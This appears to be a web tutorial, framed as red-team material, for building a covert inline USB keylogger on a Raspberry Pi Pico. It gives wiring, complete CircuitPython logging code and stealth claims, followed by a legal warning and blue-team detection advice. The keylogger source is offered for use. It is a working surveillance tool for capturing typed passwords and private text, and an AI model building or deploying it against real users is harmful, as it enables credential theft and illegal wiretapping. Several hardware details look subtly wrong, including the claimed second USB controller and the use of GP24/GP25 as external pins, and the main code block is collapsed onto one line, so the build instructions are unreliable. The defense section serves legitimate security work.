SG-36
Authorized Use Only — Wiretapping Warning

An inline USB keylogger intercepts and records private communications. Deploying this device against a keyboard you do not own or have explicit written authorization to monitor is a federal wiretapping offense under 18 U.S.C. § 2511 (Wiretap Act), in addition to computer fraud charges under 18 U.S.C. § 1030. State wiretapping statutes often carry additional penalties. Test only on your own hardware in isolated lab environments. Never deploy on shared, employer, school, or public systems.

SG-36 — Red Team Hardware

Inline USB Keylogger

Build a hardware keylogger using a Raspberry Pi Pico and a USB host adapter. The device sits inline between a keyboard and computer, transparently passing keystrokes while logging them to onboard flash storage.

Advanced ~$10 USD 3–5 Hours CircuitPython 9.x
Section 1

▶ How It Works

A hardware keylogger operates at the USB layer — it intercepts HID reports from a keyboard before they reach the host computer, logs them to storage, and re-transmits them so the user sees no disruption. This is distinct from software keyloggers that run in the OS: hardware keyloggers require no software installation, leave no OS-visible traces, and survive reboots, OS reinstalls, and AV scans.

The Raspberry Pi Pico's RP2040 chip has two USB controllers: one that can act as a USB device (connecting to the host computer) and one that — with the usb_host library in CircuitPython 9.x — can act as a USB host (connecting to the keyboard). This is the key capability that makes the Pico suitable for this build. The Pico sits in-line: keyboard plugs into the Pico's host port, Pico's device port plugs into the computer.

Detection Risk
Low (Hardware Layer)
Operates below the OS. No process visible in Task Manager. No kernel module. Survives reinstall. Detectable only by physical cable inspection or USB topology analysis.
Storage
2MB Onboard Flash
At ~1 byte per keystroke, 2MB holds approximately 2 million keystrokes — roughly 3–6 months of typical office use. Timestamps add ~20 bytes per entry.
Passthrough Latency
~1ms Added
The Pico reads the HID report from the keyboard, logs it, and re-sends it to the host within one USB polling interval. Imperceptible to users.
Hardware Limitation: USB Host Support in CircuitPython

CircuitPython's usb_host library on the Pi Pico supports HID keyboards on the host port, but requires the keyboard to be a basic HID device — not a composite device with additional interfaces. Most standard USB keyboards work. Gaming keyboards with RGB lighting, audio passthrough, or onboard macro processors may not enumerate correctly. Test with a known-good simple USB keyboard first.

▶ Wiring Diagram — USB Host Port

The RP2040 exposes its second USB controller on pins GP24 (D-), GP25 (D+), and requires 5V on VBUS to power the connected keyboard. The 27 ohm series resistors on D+ and D- are required for USB signal integrity — omitting them causes intermittent enumeration failures.

GPIO Pin Numbering Note

CircuitPython uses GPIO numbers (GP24, GP25). These correspond to physical board pins 29 and 34 on the Pi Pico. Do not confuse GPIO numbers with physical pin numbers. When in doubt, refer to the Raspberry Pi Pico pinout diagram at datasheets.raspberrypi.com/pico/pico-datasheet.pdf page 14.

Section 5

▶ Complete Code

CircuitPython — boot.py (Enable USB Host + Device) 
import usb_host
import usb_hid
import board

# Enable USB HOST on GP24/GP25 (second USB controller on RP2040)
# This allows the Pico to enumerate and read from a USB keyboard.
usb_host.Port(board.GP24, board.GP25)

# Enable USB HID on the device port (Micro-B connector to computer)
# The Pico appears as a standard USB keyboard to the host computer.
usb_hid.enable((usb_hid.Device.KEYBOARD,))
CircuitPython — code.py (Passthrough Keylogger)
import usb_host import usb_hid import board import time import storage from adafruit_hid.keyboard import Keyboard from adafruit_hid.keycode import Keycode # USB device port — outbound to host computer kbd_out = Keyboard(usb_hid.devices) # USB host port — inbound from physical keyboard (GP24/GP25) # Wait up to 5 seconds for keyboard to enumerate kbd_in = None deadline = time.monotonic() + 5.0 while time.monotonic() < deadline: for device in usb_host.devices: if (device.idVendor != 0 and device.product_id != 0 and hasattr(device, 'keyboard')): kbd_in = device.keyboard break if kbd_in: break time.sleep(0.1) if not kbd_in: # No keyboard found — blink error pattern and wait import digitalio led = digitalio.DigitalInOut(board.LED) led.direction = digitalio.Direction.OUTPUT while True: led.value = True; time.sleep(0.1) led.value = False; time.sleep(0.9) # Keycode to ASCII character mapping (US layout, unshifted) # Only printable characters; modifier keys logged with labels. KEYCODE_MAP = { Keycode.A: 'a', Keycode.B: 'b', Keycode.C: 'c', Keycode.D: 'd', Keycode.E: 'e', Keycode.F: 'f', Keycode.G: 'g', Keycode.H: 'h', Keycode.I: 'i', Keycode.J: 'j', Keycode.K: 'k', Keycode.L: 'l', Keycode.M: 'm', Keycode.N: 'n', Keycode.O: 'o', Keycode.P: 'p', Keycode.Q: 'q', Keycode.R: 'r', Keycode.S: 's', Keycode.T: 't', Keycode.U: 'u', Keycode.V: 'v', Keycode.W: 'w', Keycode.X: 'x', Keycode.Y: 'y', Keycode.Z: 'z', Keycode.ONE: '1', Keycode.TWO: '2', Keycode.THREE: '3', Keycode.FOUR: '4', Keycode.FIVE: '5', Keycode.SIX: '6', Keycode.SEVEN: '7', Keycode.EIGHT: '8', Keycode.NINE: '9', Keycode.ZERO: '0', Keycode.SPACE: ' ', Keycode.ENTER: '\n', Keycode.PERIOD: '.', Keycode.COMMA: ',', Keycode.FORWARD_SLASH: '/', } SPECIAL_KEYS = { Keycode.ENTER: '[ENTER]', Keycode.BACKSPACE: '[BS]', Keycode.TAB: '[TAB]', Keycode.ESCAPE: '[ESC]', Keycode.DELETE: '[DEL]', Keycode.WINDOWS: '[WIN]', Keycode.LEFT_ALT: '[ALT]', Keycode.LEFT_CTRL: '[CTRL]', Keycode.LEFT_SHIFT:'[SHIFT]', } # Log file on Pico flash LOG_PATH = "/keylog.txt" log_buffer = [] FLUSH_EVERY = 20 # Write to flash after every 20 keystrokes def log_entry(text): log_buffer.append(text) if len(log_buffer) >= FLUSH_EVERY: flush_log() def flush_log(): global log_buffer try: with open(LOG_PATH, "a") as f: f.write("".join(log_buffer)) log_buffer = [] except OSError: pass # Flash write error — continue logging to buffer # Write session header log_entry(f"\n--- SESSION START {time.monotonic():.0f}s uptime ---\n") # Main passthrough loop prev_keys = set() while True: try: report = kbd_in.report # 8-byte HID keyboard report except Exception: break # Keyboard disconnected # Byte 0: modifier bitmap; Bytes 2-7: up to 6 simultaneous keycodes modifiers = report[0] keycodes = [k for k in report[2:8] if k != 0] current_keys = set(keycodes) # Detect newly pressed keys (key-down events) new_keys = current_keys - prev_keys released = prev_keys - current_keys for kc in new_keys: # Forward keystroke to host computer try: kbd_out.press(kc) except Exception: pass # Log the keystroke shift_held = (modifiers & 0x22) != 0 # Left or Right Shift if kc in SPECIAL_KEYS: log_entry(SPECIAL_KEYS[kc]) elif kc in KEYCODE_MAP: ch = KEYCODE_MAP[kc] log_entry(ch.upper() if shift_held else ch) for kc in released: try: kbd_out.release(kc) except Exception: pass prev_keys = current_keys time.sleep(0.001) # 1ms poll — matches HID report rate # Keyboard disconnected — flush remaining log and halt flush_log() while True: time.sleep(1)

▶ How to Defend Against This — Blue Team Perspective

Physical Cable Inspection and Endpoint-to-Cable Tracing

An inline hardware keylogger is a physical device — it must be physically present between the keyboard and computer. Security teams performing physical security audits should trace every cable from endpoint to peripheral. Any unexpected device or inline dongle on a keyboard cable warrants investigation. This is especially important for high-value workstations, shared kiosk terminals, and hotel business center computers.

USB Topology Monitoring

USB hubs and inline devices create an additional level in the USB device tree. On Windows, the USB device tree is visible in Device Manager with "View > Devices by Connection" — a keyboard appearing as a child of an unknown hub instead of directly under a host controller is a red flag. On Linux, lsusb -t shows the USB device tree topology. Monitor for unexpected hub devices on workstations that should have keyboards connected directly to host ports.

Encrypted Input Channels

Wireless keyboards that use AES encryption (Logitech BOLT, Microsoft Ergonomic, most Bluetooth keyboards) encrypt the HID reports at the radio layer. An inline USB keylogger on a USB dongle for such keyboards would only capture already-decrypted data from the dongle's output — but it remains vulnerable. The actual protection is using keyboards with encrypted wireless protocols and ensuring the dongle is secured. Wired keyboards, by contrast, transmit plaintext HID reports that any inline device can read.

Credential Manager and Password Managers

Keyloggers capture keystrokes — including typed passwords. Using a password manager (1Password, Bitwarden, KeePass) that auto-fills credentials via clipboard or form injection (rather than simulated keyboard typing) defeats keystroke-based logging for those credentials. Combined with hardware security keys (FIDO2/WebAuthn) for authentication, this eliminates the value of captured keystroke logs for most credential theft scenarios.
